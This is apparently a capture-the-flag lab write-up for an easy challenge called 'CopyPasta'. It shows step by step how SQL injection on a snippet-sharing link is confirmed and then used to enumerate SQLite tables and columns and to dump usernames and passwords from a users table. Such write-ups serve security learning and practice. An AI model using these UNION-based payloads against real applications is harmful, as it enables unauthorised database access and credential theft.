# CopyPasta

Level: Easy\
Points: 10\
Type: Daily Challenge

Lab Interface

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

after viewing any snippet, we have option to share, which gives us link of snippet

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Possible SQLi

Using simple payload `' or 1=1— -` proves, it is vulnerable to SQLi

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

finding number of columns

`' order by 7-- -` gives error, hence the number of column is 6

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

using `' union select 1,2,3,4,5,sqlite_version()-- -` confirm database is sqlite, [visit here for more info](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)&#x20;

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

dumping table names using

```
' union select 1,2,3,4,5,group_concat(tbl_name) from sqlite_master where type='table'-- -
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

`users` table looks interesting.

Next: dumping column names from table `users`

```
' union select 1,2,3,4,5,group_concat(name) from PRAGMA_TABLE_INFO('users')-- -
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

dumping `username` and `password` columns from `users` table

```
' union select 1,2,3,4,username,password from users-- -
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
